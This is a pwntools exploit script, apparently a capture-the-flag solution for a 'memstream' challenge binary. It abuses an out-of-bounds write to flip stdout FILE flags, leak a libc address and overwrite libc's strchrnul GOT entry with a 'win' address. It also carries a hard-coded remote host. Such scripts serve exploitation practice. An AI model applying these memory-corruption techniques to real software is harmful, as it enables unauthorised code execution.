#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('memstream', checksec=False)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

def get_conn(argv=[], *a, **kw):
	host = args.HOST or '54.78.163.105'
	port = int(args.PORT or 32485)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
protect_ptr = lambda pos, ptr: (pos >> 12) ^ ptr


def write(where, what):
	sla(b'>', b'1')
	sla(b'Position: ', str(where).encode())
	sla(b'>', b'3')
	sla(b'Size: ', str(len(what)).encode())
	sla(b'Data: ', what)


curr_flags = 0x00000000fbad2887
_IO_IS_APPENDING      = 0x1000
new_flags = curr_flags | _IO_IS_APPENDING

REMOTE_CORRECTION = 0

# not sure why it differs but...
if args.REMOTE:
	REMOTE_CORRECTION = -0x3000
	
offset = 0x558e0 + REMOTE_CORRECTION

write(-offset, p32(new_flags))
write(-offset+0x20, p16(0x0))

leak = ru(b'Done')

idx = leak.find(b'\xad\xfb')
idx += 6

libc_leak = u64(leak[idx:idx+8].ljust(8, b'\x00'))
ls(f'libc_leak {libc_leak:#x}')


libc_base = libc_leak - 0x219b23
ls(f'libc_base {libc_base:#x}')

win = libc_base + 0x26d229 + REMOTE_CORRECTION
strchrnul_got = libc_base + 0x2190B8 + REMOTE_CORRECTION

ls(f'win {win:#x}')
ls(f'strchrnul_got {strchrnul_got:#x}')

strchrnul_offset = 0x56fa8 + REMOTE_CORRECTION
write(-strchrnul_offset, p64(win))

ia()
